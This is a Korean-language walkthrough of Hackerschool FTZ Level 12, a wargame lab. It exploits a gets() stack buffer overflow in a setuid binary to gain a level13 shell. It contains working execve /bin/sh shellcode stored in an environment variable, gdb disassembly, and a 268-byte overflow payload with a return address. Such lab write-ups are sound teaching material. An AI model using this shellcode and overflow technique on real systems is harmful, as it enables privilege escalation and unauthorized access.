# Hackerschool FTZ Level 12

```
login as: level12
level12@192.168.205.134's password:
[level12@ftz level12]$ ll
total 28
-rwsr-x---    1 level13  level12     13771 Mar  8  2003 attackme
-rw-r-----    1 root     level12       204 Mar  8  2003 hint
drwxr-xr-x    2 root     level12      4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level12      4096 Jan 15  2009 tmp
[level12@ftz level12]$ cat hint


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( void )
{
        char str[256];

        setreuid( 3093, 3093 );
        printf( "문장을 입력하세요.\n" );
        gets( str );
        printf( "%s\n", str );
}


[level12@ftz level12]$ export EGG=`python -c 'print "\x90"*1024+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[level12@ftz level12]$ /tmp/ge EGG
0xbffff8a1
[level12@ftz level12]$ gdb -q ./attackme
(gdb) disas main
Dump of assembler code for function main:
0x08048470 <main+0>:    push   %ebp
0x08048471 <main+1>:    mov    %esp,%ebp
0x08048473 <main+3>:    sub    $0x108,%esp
0x08048479 <main+9>:    sub    $0x8,%esp
0x0804847c <main+12>:   push   $0xc15
0x08048481 <main+17>:   push   $0xc15
0x08048486 <main+22>:   call   0x804835c <setreuid>
0x0804848b <main+27>:   add    $0x10,%esp
0x0804848e <main+30>:   sub    $0xc,%esp
0x08048491 <main+33>:   push   $0x8048538
0x08048496 <main+38>:   call   0x804834c <printf>
0x0804849b <main+43>:   add    $0x10,%esp
0x0804849e <main+46>:   sub    $0xc,%esp
0x080484a1 <main+49>:   lea    0xfffffef8(%ebp),%eax
0x080484a7 <main+55>:   push   %eax
0x080484a8 <main+56>:   call   0x804831c <gets>
0x080484ad <main+61>:   add    $0x10,%esp
0x080484b0 <main+64>:   sub    $0x8,%esp
0x080484b3 <main+67>:   lea    0xfffffef8(%ebp),%eax
0x080484b9 <main+73>:   push   %eax
0x080484ba <main+74>:   push   $0x804854c
0x080484bf <main+79>:   call   0x804834c <printf>
0x080484c4 <main+84>:   add    $0x10,%esp
0x080484c7 <main+87>:   leave
0x080484c8 <main+88>:   ret
0x080484c9 <main+89>:   lea    0x0(%esi),%esi
0x080484cc <main+92>:   nop
0x080484cd <main+93>:   nop
0x080484ce <main+94>:   nop
0x080484cf <main+95>:   nop
End of assembler dump.
(gdb) quit
[level12@ftz level12]$ (python -c 'print "A"*268+"\xff\xf8\xff\xbf"'; cat)|./attackme
문장을 입력하세요.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??

my-pass
TERM environment variable not set.

Level13 Password is "have no clue".
```

`Level11` 과 같게 bof 를 사용한 문제다. 하지만 fsb 가 없고, 입력을 `gets` 함수로 받는다는 점이 다르다.

`Level11` 과 똑같이 풀되, `python -c <명령줄>` 을 통해서 파이썬 출력을 하고,

`| (파이프라인)` 을 통해서 `gets` 함수 부분에서 위의 출력을 표준 입력을 통해 전달해주고,

 `; (세미콜론)` 를 통해서 `cat` 바이너리를 함께 실행하도록 하여, 쉘이 따진 이후에 입력을 보낼 수 있도록 한다.

정리하자면, `python -c 'print "A"*268+"\xff\xf8\xff\xbf"'` 를 통해서 `A` 268개와, `0xbffff8ff` 를 출력하고,

`cat` 명령을 실행시켜서 입력을 받고, 그 입력을 그대로 출력하는 상태로 만든다.

`|` 를 통해 파이썬으로 출력한 페이로드가 전달되고 쉘이 열린다.

그 이후에는 입력을 `cat` 명령을 통해 쉘에 명령을 내린다.